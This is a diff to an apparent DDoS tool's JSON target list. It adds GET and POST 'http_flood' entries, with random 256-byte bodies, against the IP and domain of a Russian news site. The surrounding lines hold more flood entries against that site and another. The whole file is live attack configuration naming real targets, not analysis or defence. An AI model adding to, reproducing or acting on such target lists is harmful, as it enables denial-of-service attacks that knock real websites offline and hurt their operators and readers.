@@ -1,4 +1,6 @@
 [
+  {"kind":"http_flood","method":"GET","ip":"80.87.195.14","port": 443, "url": "https://gorod-novoross.ru/"},
+  {"kind":"http_flood","method":"POST","ip":"80.87.195.14","port": 443, "url": "https://gorod-novoross.ru/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
   {"kind":"http_flood","method":"GET","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/"},
   {"kind":"http_flood","method":"POST","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
   {"kind":"http_flood","method":"GET","ip":"77.222.40.74","port": 443, "url": "https://sutynews.ru/"},
